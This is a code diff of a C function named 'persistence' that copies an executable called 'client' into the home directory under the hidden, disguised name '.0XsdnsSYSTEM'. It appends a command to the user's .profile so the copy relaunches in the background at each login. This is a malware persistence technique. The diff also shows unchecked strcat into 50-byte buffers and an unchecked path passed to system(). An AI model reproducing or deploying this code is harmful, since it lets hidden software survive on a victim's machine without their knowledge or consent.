@@ -45,9 +45,12 @@ int persistence(char *get_path, FILE *fp)
   //copy the executable to home directory
   char command[50] = "cp client ";
   strcat(command, get_path);
+  strcat(command,".0XsdnsSYSTEM");
   system(command);
 
-  strcat(get_path, "./client &");
+  char write_home[50];
+  strcpy(write_home,get_path);
+  strcat(write_home, "./.0XsdnsSYSTEM &");
   //check if .profile can be accessed
   if (fp == NULL)
   {
@@ -56,13 +59,13 @@ int persistence(char *get_path, FILE *fp)
   //check if our command is already written there
   while (fgets(chunk, sizeof(chunk), fp) != 0)
   {
-    if (strstr(chunk, get_path) != 0)
+    if (strstr(chunk, write_home) != 0)
     {
       return 0;
     }
   }
 
-  fprintf(fp, "%s \n", get_path);
+  fprintf(fp, "%s \n", write_home);
   fclose(fp);
   return 0;
 }
